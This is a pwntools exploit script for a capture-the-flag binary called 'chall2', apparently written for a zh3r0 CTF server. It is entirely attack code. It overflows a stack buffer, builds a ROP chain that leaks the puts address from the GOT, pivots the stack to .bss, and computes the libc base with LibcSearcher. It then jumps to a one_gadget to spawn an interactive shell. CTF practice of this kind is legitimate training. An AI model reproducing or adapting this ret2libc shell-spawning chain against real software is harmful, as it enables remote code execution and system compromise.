from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = 'chall2'
elf = ELF(program,checksec=False)
lokal = False
context.arch = 'amd64'

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = elf.process()
    #libc = elf.libc
else:
    host = 'asia.pwn.zh3r0.ml'
    port = '7412'
    xp = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = "b *0x00000000004007c3 \n b *0x400717 \n c"
    gdb.attach(xp,cmd)

#Exploit Here
p = "A"*(8*3)
p += "A"*16
p += "\x17"
# p += p64(0x400717)
s(p)

libcstart = elf.got['puts']
puts = elf.plt['puts']
main = 0x400717
pop_rdi = 0x0000000000400943
ret = 0x00000000004005b6
#
p = p64(elf.bss()+0x100)
p += p64(pop_rdi)
p += p64(libcstart)
p += p64(elf.plt['puts'])
p += p64(pop_rdi)
p += p64(0)
p += p64(0x0000000000400941)
p += p64(elf.bss()+0x100)*2
p += p64(elf.plt['read'])
p += p64(0x0000000000400778)

print len(p)
sl(p)

p = "A"*32
p += p64(0x601100)
p += p64(0x0000000000400778)
sla("name? \n",p)

leak =  uu64(xp.recvline().strip("\n"))
print hex(leak)

libc = LibcSearcher('puts', leak)

libcbase = leak - libc.dump('puts')
log.info("Libc Base : {}".format(hex(libcbase)))

one = libcbase + 0x4f322

p = p64(0)
p += p64(one)

sl(p)

xp.interactive()
